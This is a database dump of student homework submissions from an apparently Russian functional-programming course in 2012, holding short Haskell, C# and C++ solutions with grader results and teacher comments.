(2108, 59, '3742311', '2012-10-15 19:53:23', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace Task131\r\n{\r\n    public static class Program\r\n    {\r\n        public static IEnumerable<int> NonZeroLastDigits(IEnumerable<int> list)\r\n        {\r\n            return list.Select(x => x % 10).Where(x => x != 0);\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            int[] list = {354, 20, 9, 31};\r\n\r\n            IEnumerable<int> nonZeroLastDigits = NonZeroLastDigits(list);\r\n\r\n            foreach (var digit in nonZeroLastDigits)\r\n            {\r\n                Console.WriteLine(digit);\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2109, 57, '550896', '2012-10-15 21:25:04', 0, 'canMakeScheme :: [Int] -> Int -> Bool\n\ncanMakeScheme a m = canMake [(map (fromIntegral) a)] (fromIntegral m)\n\n\n\ncanMake :: [[Double]] -> Double -> Bool\n\ncanMake a m | null a = False\n\ncanMake a m | checkAll a m = True\n\ncanMake a m | length (head a) == 1 = False\n\ncanMake a m = canMake (updateListAll a [] (length (head a))) m\n\n\n\nupdateListAll :: [[Double]] -> [[Double]] -> Int -> [[Double]]\n\nupdateListAll a inc l | null a = inc\n\nupdateListAll a inc l = updateListAll (tail a) (inc ++ updateList (head a) l) l\n\n\n\nupdateList :: [Double] -> Int -> [[Double]]\n\nupdateList a l = \n\n  [[(getNewParallel a i j)] ++ (cutElements a i j)\n\n     | i <- [0..(l-1)], j <- [0..(l - 1)], i < j]  ++\n\n  [[(getNewSequential a i j)] ++ (cutElements a i j)\n\n     | i <- [0..(l-1)], j <- [0..(l - 1)], i < j]   \n\n\n\ngetNewParallel :: [Double] -> Int -> Int -> Double\n\ngetNewParallel a i j = parallel (head (drop i a)) (head (drop j a))\n\n\n\ngetNewSequential :: [Double] -> Int -> Int -> Double\n\ngetNewSequential a i j = sequential (head (drop i a)) (head (drop j a))\n\n\n\ncutElements :: [Double] -> Int -> Int -> [Double]\n\ncutElements a i j = (take (i - 1) a) ++ (take (j - i) (drop (i) a)) ++ (drop (j+1) a)\n\n\n\ncheckAll :: [[Double]] -> Double -> Bool\n\ncheckAll a m | null a = False\n\ncheckAll a m | checkList (head a) m = True\n\ncheckAll a m = checkAll (tail a) m\n\n\n\ncheckList :: [Double] -> Double -> Bool\n\ncheckList a m | null a = False\n\ncheckList a m | (head a - m) < 0.01 = True\n\ncheckList a m = checkList (tail a) m\n\n\n\nparallel :: Double -> Double -> Double\n\nparallel x y = (1 / (x)) + (1 / (y))\n\n\n\nsequential :: Double -> Double -> Double\n\nsequential x y = x + y\n\n\n', 'Выражение имеет неправильное значение: canMakeScheme [4,4,5] 1'),
(2110, 57, '550896', '2012-10-15 21:46:49', 1, 'canMakeScheme :: [Int] -> Int -> Bool\r\n\r\ncanMakeScheme a m = canMake [(map (fromIntegral) a)] (fromIntegral m)\r\n\r\n\r\n\r\ncanMake :: [[Double]] -> Double -> Bool\r\n\r\ncanMake a m | null a = False\r\n\r\ncanMake a m | checkAll a m = True\r\n\r\ncanMake a m | length (head a) == 1 = False\r\n\r\ncanMake a m = canMake (updateListAll a [] (length (head a))) m\r\n\r\n\r\n\r\nupdateListAll :: [[Double]] -> [[Double]] -> Int -> [[Double]]\r\n\r\nupdateListAll a inc l | null a = inc\r\n\r\nupdateListAll a inc l = updateListAll (tail a) (inc ++ updateList (head a) l) l\r\n\r\n\r\n\r\nupdateList :: [Double] -> Int -> [[Double]]\r\n\r\nupdateList a l = \r\n\r\n  [[(getNewParallel a i j)] ++ (cutElements a i j)\r\n\r\n     | i <- [0..(l-1)], j <- [0..(l-1)], i < j]  ++\r\n\r\n  [[(getNewSequential a i j)] ++ (cutElements a i j)\r\n\r\n     | i <- [0..(l-1)], j <- [0..(l-1)], i < j]   \r\n\r\n\r\n\r\ngetNewParallel :: [Double] -> Int -> Int -> Double\r\n\r\ngetNewParallel a i j = parallel (head (drop i a)) (head (drop j a))\r\n\r\n\r\n\r\ngetNewSequential :: [Double] -> Int -> Int -> Double\r\n\r\ngetNewSequential a i j = sequential (head (drop i a)) (head (drop j a))\r\n\r\n\r\n\r\ncutElements :: [Double] -> Int -> Int -> [Double]\r\n\r\ncutElements a i j = (take (i) a) ++ (take (j - i - 1) (drop (i+1) a)) ++ (drop (j+1) a)\r\n\r\n\r\n\r\ncheckAll :: [[Double]] -> Double -> Bool\r\n\r\ncheckAll a m | null a = False\r\n\r\ncheckAll a m | checkList (head a) m = True\r\n\r\ncheckAll a m = checkAll (tail a) m\r\n\r\n\r\n\r\ncheckList :: [Double] -> Double -> Bool\r\n\r\ncheckList a m | null a = False\r\n\r\ncheckList a m | (abs (head a - m)) < 0.00001 = True\r\n\r\ncheckList a m = checkList (tail a) m\r\n\r\n\r\n\r\nparallel :: Double -> Double -> Double\r\n\r\nparallel x y = 1/ ((1 / (x)) + (1 / (y)))\r\n\r\n\r\n\r\nsequential :: Double -> Double -> Double\r\n\r\nsequential x y = x + y\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2111, 68, '2562137', '2012-10-15 22:18:29', 1, 'using System;\r\nusing System.Linq;\r\n\r\nnamespace ReplaceZero\r\n{\r\n    class MainClass\r\n    {\r\n    	static int[] zeroDigits(int[] a, int n) {\r\n    		if (n > 0) {\r\n    			a = a.Select(x => x / 10).ToArray();\r\n    			a = zeroDigits(a, n-1);\r\n    			a = a.Select(x => x * 10).ToArray();\r\n    		}\r\n    		return a;\r\n    	}\r\n        static void Main(string[] args)\r\n        {\r\n        	int[] a = {563, 5643, 76796};\r\n        	int[] b = zeroDigits(a, 2);\r\n\r\n        	foreach (int i in b) Console.Write(i + " ");\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2112, 67, '2562137', '2012-10-15 22:28:13', 1, '#include <iostream>\r\n#include <algorithm>\r\nusing namespace std;\r\n\r\nvoid zeroDigits(int *a, int size, int n) {\r\n	transform(a, a+size, a,\r\n		[n] (int x) {\r\n			for (int i = 0; i < n; i++) x /= 10;\r\n			for (int i = 0; i < n; i++) x *= 10;\r\n			return x; \r\n		});\r\n   --- OK, но лучше, конечно, было бы один раз вне transform посчитать 10^n, а потом использовать.\r\n}\r\n\r\nint main()\r\n{\r\n	int a[3] = {563, 5643, 76796};\r\n	zeroDigits(a, 3, 2);\r\n\r\n	for (int i = 0; i < 3; i++) {\r\n		cout << a[i] << " ";\r\n	}\r\n	\r\n	return 0;\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2113, 56, '51559263', '2012-10-16 00:08:29', 1, 'allLists n k = [ [ let\r\n\r\n                      step = n^(k-j)\r\n\r\n                      steps = div i step\r\n\r\n                      unstep = rem i step\r\n\r\n\r\n\r\n                      val = rem steps n\r\n\r\n\r\n\r\n                   in if val == 0 && unstep == 0 then n\r\n\r\n                      else if unstep == 0 then val\r\n\r\n                      else val + 1\r\n\r\n                 | j <- [1..k] ]\r\n\r\n               | i <- [1..n^k] ]\r\n', '<br/>Тесты успешно пройдены!'),
(2114, 64, '3431532', '2012-10-16 05:25:05', 1, 'data Node = Node Int Node Node | Empty\r\n\r\nmain = do print $ foldTree (*) 1 (Node 2 (Node 2 (Node 2 Empty Empty) Empty) (Node 2 Empty (Node 2 Empty Empty)))\r\n\r\n--print $ foldTree (+) 0 (Node 2 (Node 2 (Node 2 Empty Empty) Empty) (Node 2 Empty (Node 2 Empty Empty)))\r\n\r\n\r\nfoldTree f x (Empty) = x\r\nfoldTree f x (Node value right left) = foldTree f (foldTree f (f x value) right) left', '<br/>Тесты успешно пройдены!'),
(2115, 63, '63706456', '2012-10-16 09:46:31', 1, 'fives = list 5\r\nlist n = n:(list (n*10+5))', '<br/>Тесты успешно пройдены!'),
(2116, 61, '471091', '2012-10-16 10:10:38', 1, 'divisor n = [x|x<-[1..(n `div` 2)], n `mod` x == 0]\r\nsumDiv n = sum (divisor n)\r\nperfects n = [x|x<-[1..n], x == sumDiv x]', '<br/>Тесты успешно пройдены!'),
(2117, 62, '471091', '2012-10-16 10:11:46', 1, 'divisor n = [x|x<-[1..(n `div` 2)], n `mod` x == 0]\r\nsumDiv n = sum (divisor n)\r\namicables n = [(x,y)|x<-[1..n], y<-[x..n], x == sumDiv y, y == sumDiv x, x < y] \r\n  --- OK, но можно на самом деле написать то же гораздо эфективнее. Мы это обсудим.', '<br/>Тесты успешно пройдены!'),
(2118, 63, '471091', '2012-10-16 10:12:46', 1, 'five 0 = 5\r\nfive n = (five (n-1))*10+5 \r\nfives = map five [0..]', '<br/>Тесты успешно пройдены!'),
(2119, 64, '63706456', '2012-10-16 10:15:54', 1, 'data Tree a = Node a (Tree a) (Tree a) | Empty deriving Show\r\n\r\nfoldTree f def (Node num left right) = 	f num (recCall left) (recCall right)\r\n					where recCall = foldTree f def\r\nfoldTree f def Empty = def\r\n\r\nheigth = foldTree (a b c -> 1 + max b c) (-1)\r\n\r\nfoldTree'' f = foldTree (x y z -> f x (f y z))\r\nsumTree = foldTree'' (+) 0\r\nproductTree = foldTree'' (*) 1', '<br/>Тесты успешно пройдены!'),
(2120, 68, 'tonyo', '2012-10-16 11:20:38', 1, 'using System;                                                                                                                                                                                   \r\nusing System.Linq;\r\n\r\npublic class Pr16_1\r\n{\r\n\r\n  static int pow(int x, int n)\r\n  {\r\n    int res = 1;\r\n    while (n>0)\r\n    {   \r\n      if (n % 2 == 1)\r\n        res *= x;\r\n      x *= x;\r\n      n >>= 1;\r\n    }   \r\n    return res;\r\n  }\r\n\r\n\r\n  static int[] zeroDigits(int[] a, int n)\r\n  {\r\n    return a.Select(x => x - x % pow(10, n)).ToArray();\r\n      --- OK, но тут, на самом деле, легко можно сделать гораздо эффективнее\r\n  }\r\n\r\n\r\n  static void Main()\r\n  {\r\n    int[] a = {563, 5643, 76796};\r\n    int[] b = zeroDigits(a, 2); \r\n    for (int i = 0; i < b.Length; i++)\r\n      Console.Write("{0} ", b[i]);\r\n  }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2121, 67, 'tonyo', '2012-10-16 11:21:04', 1, '#include <iostream>                                                                                                                                                                             \r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nconst int maxn = 20; \r\n\r\nint pow(int x, int p)\r\n{\r\n  int res = 1;\r\n  while (p-- > 0)\r\n    res *= x;\r\n  return res;\r\n}\r\n\r\nvoid zeroDigits(int ar[], int size, int n)  \r\n{\r\n    if (size > maxn)\r\n    {   \r\n        cerr << "Size error\r\n";\r\n        return;\r\n    }   \r\n\r\n    int b[maxn];\r\n    transform(ar, ar+size, b, [n](int x){ return x - (x % pow(10, n));});\r\n          --- Ну и тут соотвественно тоже - можно в capture list передать не n а что-то другое. ОК, это мы обсудим.\r\n    for (int *i = b; i < b+size; i++)\r\n        cout << *i << " ";\r\n} \r\n\r\n\r\nint main()\r\n{\r\n    int ar[] = {563, 5643, 76796};\r\n    int size = sizeof(ar)/sizeof(int);\r\n\r\n    zeroDigits(ar, size, 2); \r\n    return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2122, 61, '14561781', '2012-10-16 12:25:57', 1, 'sumDiv n = foldr (+) 0 [x | x <- [1..n `div` 2], n `mod` x == 0]\r\n\r\n\r\n\r\nperfects n = [y | y <- [1..n], sumDiv y == y]\r\n', '<br/>Тесты успешно пройдены!'),
(2123, 61, 'Маргарита Нурмухаметова', '2012-10-16 13:05:30', 1, 'sumDiv n = sum (map (i -> if n `mod` i == 0 then i else 0) [1..n`div`2])\r\n\r\nperfects m = [x|x <- [1..m], sumDiv x == x]\r\n', '<br/>Тесты успешно пройдены!'),
(2124, 63, 'Маргарита Нурмухаметова', '2012-10-16 13:05:57', 2, 'fives = map (i -> take i (repeat 5)) [1..]\r\n   --- У вас получается список списков, а надо - список чисел..\r\n   --- (Но если не придумаете, пришлите это решение еще раз, я его зачту) \r\n\r\n\r\n', 'Выражение имеет неправильное значение: take 4 fives'),
(2125, 65, '63706456', '2012-10-16 13:26:23', 1, 'cantor = [x|n <- [1..], x <- (zip [0..n] [n, n-1..0])]\r\n   --- У вас у ответе включены пары, содержащие 0, а у меня в условии было про положительные числа\r\n   --- Это, конечно, не принципиально, но все-таки исправьте, пожалуйста.', 'Выражение имеет неправильное значение: length[x|(x,y)<-take 100 cantor, x<=0||y<=0]'),
(2126, 63, '419046', '2012-10-17 06:57:24', 0, 'allLists n 0 = [[]]\r\n\nallLists n k = [ x:xs | x <- [1..n], xs <- (allLists n (k - 1))]\r\n\n\n', 'Не удалось вычислить выражение "take 4 fives", проверьте правильность синтаксиса'),
(2127, 56, '419046', '2012-10-17 06:58:36', 1, 'allLists n 0 = [[]]\r\n\r\nallLists n k = [ x:xs | x <- [1..n], xs <- (allLists n (k - 1))]\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2128, 63, '419046', '2012-10-17 07:01:34', 1, 'fives = [foldl (x y -> x * 10 + y) 0 (replicate n 5) | n <- [1..]]\r\n', '<br/>Тесты успешно пройдены!'),
(2129, 65, '6774563', '2012-10-17 08:08:06', 1, '-- идея: идти по диагонали\r\ncantor = [(i-j,j+1) | i <- [1..], j <- [0..(i-1)]]\r\n', '<br/>Тесты успешно пройдены!'),
(2130, 66, '6774563', '2012-10-17 08:08:39', 1, 'generalizedCantor n = [a | s <- [1..], a <- (partitions s n)]\r\n\r\n-- всевозможные разбиения s на n слагаемых\r\npartitions s n | s < n = []\r\npartitions s 1 = [[s]]\r\npartitions s n = [a | i <- [1..(s-n+1)], a <- (map (i:) (partitions (s-i) (n-1) ) ) ]\r\n', '<br/>Тесты успешно пройдены!'),
(2131, 61, '6774563', '2012-10-17 08:10:01', 1, 'sumDiv 1 = 0\r\nsumDiv n = sumDivImpl n (truncate (sqrt (fromIntegral n) + 0.000000001)) 0\r\n\r\nsumDivImpl _ 1 acc = acc + 1\r\nsumDivImpl n cur acc | cur * cur == n   = sumDivImpl n (cur-1) (acc+cur)\r\n		     | n `mod` cur == 0 = sumDivImpl n (cur-1) (acc + cur + (n `div` cur))\r\n		     | otherwise        = sumDivImpl n (cur-1) acc \r\n\r\nperfects n = filter (x -> sumDiv x == x) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(2132, 62, '6774563', '2012-10-17 08:10:35', 1, 'amicables n = map snd (filter (((a,b),(c,d)) -> b == c && a == d) [((a,b),(c,d)) | (a,b) <- sums, (c,d) <- take (a-1) sums]) where\r\n	sums = map (x -> (x, sumDiv x)) [1..n]\r\n\r\nsumDiv 1 = 0\r\nsumDiv n = sumDivImpl n (truncate (sqrt (fromIntegral n) + 0.000000001)) 0\r\n\r\nsumDivImpl _ 1 acc = acc + 1\r\nsumDivImpl n cur acc | cur * cur == n   = sumDivImpl n (cur-1) (acc+cur)\r\n		     | n `mod` cur == 0 = sumDivImpl n (cur-1) (acc + cur + (n `div` cur))\r\n		     | otherwise        = sumDivImpl n (cur-1) acc \r\n', '<br/>Тесты успешно пройдены!'),
(2133, 63, '6774563', '2012-10-17 08:10:56', 1, 'fives = fivesImpl 5\r\n\r\nfivesImpl n = n:(fivesImpl (n*10 + 5))\r\n', '<br/>Тесты успешно пройдены!'),
(2134, 64, '6774563', '2012-10-17 08:12:49', 1, 'data Tree =  Empty | Node Int Tree Tree\r\n\r\n-- насчет более продвинутого варианта: мб можно как-нибудь передавать разные лямбды на обработку \r\n-- левого и правого поддереаьев... я позже подумаю, потом пришлю реализацию\r\nfoldTree op acc Empty = acc\r\nfoldTree op acc (Node key left right) = let leftAcc = foldTree op acc left in op key (foldTree op leftAcc right)\r\n   --- Подумайте, ОК.. ', '<br/>Тесты успешно пройдены!'),
(2135, 64, 'erwert', '2012-10-17 09:02:53', 1, 'data Tree = Empty | Node Double Tree Tree deriving(Show,Eq)\r\n\r\nfoldTree f r Empty = r\r\nfoldTree f result (Node i l r) =  foldTree f (foldTree f (f result i) l) r', '<br/>Тесты успешно пройдены!'),
(2136, 63, 'sromanov', '2012-10-17 09:13:10', 0, 'let fives = map (*5) $ map (k -> foldl (acc p -> acc + 10^p) 0 [0..k-1]) [1..]', 'Не удалось вычислить выражение "take 4 fives", проверьте правильность синтаксиса'),
(2137, 63, 'sromanov', '2012-10-17 09:15:50', 1, 'fives = map (*5) $ map (k -> foldl (acc p -> acc + 10^p) 0 [0..k-1]) [1..]', '<br/>Тесты успешно пройдены!'),
(2138, 66, 'Deutsche', '2012-10-17 09:16:58', 1, 'This problem was sent by email, accept it please', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2139, 61, '528420', '2012-10-17 09:45:12', 1, 'divxs n = [ x | x<-[1..(n-1)], n`mod`x == 0]\r\nsumDiv n = sum (divxs n)\r\nperfects n = [ x | x<-[1..n], sumDiv x == x]', '<br/>Тесты успешно пройдены!'),
(2140, 61, '1029771', '2012-10-17 09:45:30', 1, 'sumDiv n = sum([x| x <- [1..(n-1)],rem n x == 0])\r\n\r\nperfects n = [x| x <- [1..(n-1)], sumDiv x == x]', '<br/>Тесты успешно пройдены!'),
(2141, 63, '528420', '2012-10-17 09:45:41', 1, 'fives = 5 : (map(x -> x*10+5) fives)', '<br/>Тесты успешно пройдены!'),
(2142, 62, '1029771', '2012-10-17 09:54:54', 1, 'sumDiv n = sum([x| x <- [1..(n-1)],rem n x == 0])\r\n\r\namicables n = [(x,y)| x <- [1..(n-1)], y <- [(x+1)..(n-1)], sumDiv x == y, sumDiv y == x]\r\n  --- OK, все правильно, но, на  самом деле, эту программу можно немного исправить,\r\n  --- чтобы она стала _гораздо_ эффективнее. Мы это завтра обсудим.', '<br/>Тесты успешно пройдены!'),
(2143, 62, '528420', '2012-10-17 09:59:57', 1, 'divxs n = [ x | x<-[1..(n-1)], n`mod`x == 0]\r\nsumDiv n = sum (divxs n)\r\n\r\nlst n = map(x -> (x, sumDiv x, sumDiv (sumDiv x))) [1..n]\r\namicables n = [(a,b) | (a,b,c)<-(lst n), a == c, a<b ]', '<br/>Тесты успешно пройдены!'),
(2144, 63, '1029771', '2012-10-17 10:03:51', 1, 'five n = (n * 10 + 5) : five (n * 10 + 5);\r\n\r\nfives = five 0', '<br/>Тесты успешно пройдены!'),
(2145, 57, '3607492', '2012-10-17 11:54:51', 1, 'check _ 0 _= True\r\ncheck (y:[]) n d= (y==n)||(case d of \r\n							t:ts->((test (t:ts) (y:[]) n []))\r\n							_->False)\r\ncheck (x:y:xs) n d= (check ((x*y/(x+y)):xs) n d) \r\n				|| (check ((x+y):xs) n d) \r\n				|| (case xs of\r\n					z:zs->(check ((x+z):y:zs) n d)||(check ((x*z/(x+z)):y:zs) n d)\r\n					_ -> False) \r\n				|| (check (y:xs) n (x:d))\r\n				|| (case d of\r\n					t:ts->(test (t:ts) (x:y:xs) n []) \r\n					_->False)\r\n\r\n\r\n\r\ntest [] _ _ _ = False\r\ntest (d:ds) (x:xs) n f= (check ((x+d):xs) n (ds++f)) || (check ((x*d/(x+d)):xs) n (ds++f) )\r\n || (test ds (x:xs) n (d:f))\r\n\r\n\r\n\r\ncanMakeScheme [] _ = False\r\ncanMakeScheme x n = if ( any (n==) x ) then True else (check x n [])\r\n\r\n{-Для 9 пока не доработал..-}\r\n\r\n--- Вмдимо, не совсем правильно, потому что смотрите, вот такой пример\r\n---   canMakeScheme [130, 20, 30, 70] 41  - возвращает True\r\n---      и в то же время\r\n---   canMakeScheme [130, 20, 30, 70, 400] 41 - возвращает False\r\n--- А я просто добавил еще один резистор\r\n--- Ясно, что что-то из этого неправильно (не знаю что, честно говоря..)\r\n--- Попробуйте исправить, пожалуйсти.. ', '<br/>Тесты успешно пройдены!'),
(2146, 68, '2118411', '2012-10-17 12:17:47', 1, '﻿using System;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            foreach (uint x in zeroDigits(new uint[] { 563, 5643, 76796 }, 2))\r\n\r\n            {\r\n\r\n                Console.Write("{0}  ", x);\r\n\r\n            }\r\n\r\n            Console.WriteLine();\r\n\r\n        }\r\n\r\n\r\n\r\n        static uint[] zeroDigits(uint[] a, uint n)\r\n\r\n        {\r\n\r\n            uint d = (uint)Math.Pow(10, n);\r\n\r\n            return a.Select(x => (x / d)*d).ToArray();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2147, 67, '2118411', '2012-10-17 12:18:23', 1, '#include <iostream>\r\n\r\n#include <stdint.h>\r\n\r\n#include <algorithm> \r\n\r\nusing namespace std;\r\n\r\n\r\n\r\nvoid zeroDigits(uint32_t* a, int size, int n)\r\n\r\n{\r\n\r\n	uint32_t d = (uint32_t)pow(10.0, n);\r\n\r\n	transform(a, a+(n+1), a, [d](uint32_t i){return (i/d)*d;});\r\n\r\n}\r\n\r\n\r\n\r\nint main () \r\n\r\n{\r\n\r\n	uint32_t input[] = {563, 5643, 76796};\r\n\r\n	int n = sizeof(input)/sizeof(uint32_t);\r\n\r\n	\r\n\r\n	uint32_t* pbegin = input;\r\n\r\n	uint32_t* pend = input + n;\r\n\r\n	\r\n\r\n	zeroDigits(input, n, 2);\r\n\r\n\r\n\r\n	for (uint32_t* p = pbegin; p != pend; p++)\r\n\r\n	{\r\n\r\n		cout << " " << *p;\r\n\r\n	}\r\n\r\n\r\n\r\n	return 0;\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2148, 65, '3607492', '2012-10-17 12:24:17', 1, 'func n k = (n,k):(if (n>k) then ((k,n):func n (k+1)) else\r\n											func (n+1) 1) \r\n\r\ncantor = func 1 1', '<br/>Тесты успешно пройдены!'),
(2149, 66, '3607492', '2012-10-17 12:35:52', 1, 'plus (x:xs) k= if (x==k) then ((x+1):xs) else (x:(plus xs k))\r\n\r\nfunc x k = ([x]: if (all ((k+1)==) x) then func (plus x (k+1)) (k+1) else func (plus x k) k)\r\n\r\ngeneralizedCantor n = func (take n(repeat 1)) 1\r\n   --- Дело в том, что у вас не список списков, а список из списков спискоа', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2150, 65, '2118411', '2012-10-17 13:46:49', 1, 'cantor = [(x+1,y+1)| i<-[0..], let ir = floor (sqrt (fromIntegral i)), let irs = ir*ir, let (x,y) = if (i - irs < ir) then ((i-irs),ir) else (ir, i-irs-ir)]', '<br/>Тесты успешно пройдены!'),
(2151, 66, '2118411', '2012-10-17 13:47:43', 1, 'unpair i = (x+1,y+1)\r\n  where\r\n	ir = floor (sqrt (fromIntegral i))\r\n	irs = ir*ir\r\n	(x,y) = if (i - irs < ir) then ((i-irs),ir) else (ir, i-irs-ir)\r\n\r\ntestIt n i = (foldr (.) id (replicate (n-1) ((y:ys)->(fst (unpair y)):(snd (unpair y)):ys)) (i:[]));\r\n    \r\ngeneralizedCantor n = [xs| i<-[0..], let xs = (foldr (.) id (replicate (n-1) ((y:ys)->(fst (unpair y)):(snd (unpair y)):ys)) (i:[]))]', '<br/>Тесты успешно пройдены!'),
(2152, 64, '3607492', '2012-10-17 14:02:49', 1, 'data Tree a = Leaf a | Branch a (Tree a) (Tree a)\r\n\r\nfoldTree::(a->a->a)->a->Tree a->a\r\nfoldTree f el (Leaf d) = f el d\r\nfoldTree f el (Branch d (x) (y)) = f (f el d) (f (foldTree f el x) (foldTree f el y))\r\n\r\n\r\nmain = print (foldTree (*) 1 (Branch 1 (Branch 2 (Leaf 1) (Leaf 2)) (Branch 1 (Branch 1 (Leaf 1) (Leaf 2)) (Leaf 2)) ) )', '<br/>Тесты успешно пройдены!'),
(2153, 62, 'Маргарита Нурмухаметова', '2012-10-17 14:26:08', 1, '\r\namicables m = [(x,y)|x <- [1..m], y <- [1..m], x<y, y == sumDiv x, x == sumDiv y]\r\n  --- OK, все правильно, но тут легко можно написать гораздо эффективнее, мы это завтра обсудим.\r\n     where sumDiv n = sum (map (i -> if n `mod` i == 0 then i else 0) [1..n`div`2])\r\n', '<br/>Тесты успешно пройдены!'),
(2154, 61, '63706456', '2012-10-17 14:31:58', 0, 'primes = 	func [2..]\r\n		where func (x:xs) = (x: (filter (y-> mod y x /= 0) (func xs)))\r\n\r\nsummdiv n = (summ n 1 primes) - n\r\n\r\nsumm n acc (x:xs) 	| n == 1 = acc\r\n			| mod n x == 0 = let (newN, newAcc) = process (n,acc)\r\n						in summ newN newAcc xs\r\n			| otherwise = summ n acc xs\r\n			where process = until 	((y,s) -> mod y x /= 0) \r\n						((y,s) -> (div y x, s*x+acc))\r\n\r\nperfects n = [x| x <- [1..n], sumDiv x == x]', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(2155, 61, '63706456', '2012-10-17 14:32:10', 1, 'primes = 	func [2..]\r\n		where func (x:xs) = (x: (filter (y-> mod y x /= 0) (func xs)))\r\n\r\nsumDiv n = (summ n 1 primes) - n\r\n\r\nsumm n acc (x:xs) 	| n == 1 = acc\r\n			| mod n x == 0 = let (newN, newAcc) = process (n,acc)\r\n						in summ newN newAcc xs\r\n			| otherwise = summ n acc xs\r\n			where process = until 	((y,s) -> mod y x /= 0) \r\n						((y,s) -> (div y x, s*x+acc))\r\n\r\nperfects n = [x| x <- [1..n], sumDiv x == x]', '<br/>Тесты успешно пройдены!'),
(2156, 61, '5656962', '2012-10-17 14:39:09', 1, 'sumDiv n = sum[k | k <- [1..n `div` 2], n `mod` k == 0]\r\n\r\n\r\n\r\nperfects n = [k | k <- [1..n], k == sumDiv k]\r\n', '<br/>Тесты успешно пройдены!'),
(2157, 63, '5656962', '2012-10-17 14:39:41', 1, 'fives = 5: map(i -> 5*10^i + fives!!(i - 1)) [1..]\r\n', '<br/>Тесты успешно пройдены!'),
(2158, 67, '12206137', '2012-10-17 14:48:51', 1, '// DZ_16_2.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include "stdafx.h"\r\n#include <algorithm>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nvector<int> *zeroDigits(const int* a, int size, int n) {\r\n	vector<int> *res = new vector<int>(size);\r\n	int tenpow = 1;\r\n	while (n --> 0) {\r\n		tenpow *= 10;\r\n	}\r\n	transform(a, a+size, res->begin(), [tenpow](int x) {return x - x % tenpow;});\r\n	return res;\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	const int size = 3;\r\n	int a[size] = {563, 5643, 76796};\r\n	vector<int> *res = zeroDigits(a, size, 2);\r\n	for (int i = 0; i < res->size(); i++) {\r\n		printf("%d ", (*res)[i]);\r\n	}\r\n	printf("\r\n");\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2159, 68, '12206137', '2012-10-17 14:49:13', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace DZ_16_1 {\r\n    class Program {\r\n        static int[] zeroDigits(int[] a, int n) {\r\n            var tenpow = 1;\r\n            while (n --> 0) {\r\n                tenpow *= 10;\r\n            }\r\n            return a.Select(x => x - x % tenpow).ToArray();\r\n        }\r\n        static void Main(string[] args) {\r\n            int[] a = { 563, 5643, 76796 };\r\n            foreach (int x in zeroDigits(a, 2)) {\r\n                Console.Write(x + " ");\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2160, 62, '63706456', '2012-10-17 14:56:46', 1, 'amicables n = [	(x,y) | \r\n		let zipped = (map (x -> (x,summdiv x)) [1..n]),\r\n		(x,y) <- zipped, (y,x) `elem` zipped, x < y]\r\n\r\n\r\nprimes = 	func [2..]\r\n		where func (x:xs) = (x: (filter (y-> mod y x /= 0) (func xs)))\r\n\r\nsummdiv n = (summ n 1 primes) - n\r\n\r\nsumm n acc (x:xs) 	| n == 1 = acc\r\n			| mod n x == 0 = let (newN, newAcc) = process (n,acc)\r\n						in summ newN newAcc xs\r\n			| otherwise = summ n acc xs\r\n			where process = until 	((y,s) -> mod y x /= 0) \r\n						((y,s) -> (div y x, s*x+acc))', '<br/>Тесты успешно пройдены!'),
(2161, 64, '383483', '2012-10-17 15:12:58', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nfoldTree f e Empty = 0\r\nfoldTree f e (Node x l r)\r\n       | (f e 1) == (e+1) = sumTree (Node x l r)\r\n       | (f e 1) == (e*1) = prodTree (Node x l r)\r\nsumTree Empty = 0\r\nsumTree (Node x l r) = x + (sumTree l) + (sumTree r)\r\nprodTree Empty = 1\r\nprodTree (Node x l r) = x*(prodTree l)*(prodTree r)\r\n   --- Нет, Екатерина, это не совсем то, что имелось в виду, но ОК, засчитано,\r\n   --- и мы это разберем ', '<br/>Тесты успешно пройдены!'),
(2162, 56, '528420', '2012-10-17 15:35:05', 1, 'allLists n 1 = [[x] | x<-[1..n]]\r\nallLists n k = [a++[x] | x<-[1..n], a<-(allLists n (k-1))\r\n  --- OK, но лучше в начало приписывать (x:a), так будет гораздо быстрее', '<br/>Тесты успешно пройдены!'),
